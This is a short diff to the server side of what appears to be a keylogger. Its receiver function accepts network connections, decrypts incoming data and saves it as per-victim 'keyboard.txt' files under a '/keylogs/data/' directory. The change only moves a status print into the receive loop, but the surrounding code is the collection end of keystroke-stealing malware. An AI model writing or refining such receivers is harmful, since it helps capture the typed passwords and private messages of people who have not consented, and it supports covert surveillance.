@@ -71,7 +71,7 @@ def receiver(port):
 
     while True:
         client_socket, client_address = server_socket.accept()
-        print(f"{client_address} - ONLINE")
+        
 
         ficname = f"{client_address[0]}-{datetime.date.today()}-keyboard.txt"
         # recu data
@@ -79,6 +79,7 @@ def receiver(port):
             data = client_socket.recv(1024)
             if data :
                 f.write(dechiffrement(data))
+                print(f"{client_address} - ONLINE")
                 print("Update sur /keylogs/data/" + ficname)
     client_socket.close()
     server_socket.close()
